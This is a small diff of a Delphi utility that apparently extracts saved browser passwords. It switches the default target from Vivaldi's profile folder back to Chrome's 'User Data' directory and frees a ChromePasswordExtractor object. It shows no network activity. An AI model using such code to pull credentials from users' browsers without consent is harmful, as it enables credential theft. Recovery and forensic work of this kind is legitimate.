@@ -35,8 +35,8 @@ begin
   try
     ShGetFolderPath(0, CSIDL_LOCAL_APPDATA, 0, 0, LBuffer);
     if ParamCount = 0 then
-      //LBaseDirectory := IncludeTrailingPathDelimiter(LBuffer) + 'Google\Chrome\User Data\'
-      LBaseDirectory := IncludeTrailingPathDelimiter(LBuffer) + 'Vivaldi\User Data\'
+      LBaseDirectory := IncludeTrailingPathDelimiter(LBuffer) + 'Google\Chrome\User Data\'
+      //LBaseDirectory := IncludeTrailingPathDelimiter(LBuffer) + 'Vivaldi\User Data\'
       //LBaseDirectory := IncludeTrailingPathDelimiter(LBuffer) + 'Microsoft\Edge\User Data\'
     else
       LBaseDirectory := IncludeTrailingPathDelimiter(LBuffer) + ParamStr(1);
@@ -78,3 +78,4 @@ begin
     LChromePasswordExtractor.Free;
   end;
 end.
+
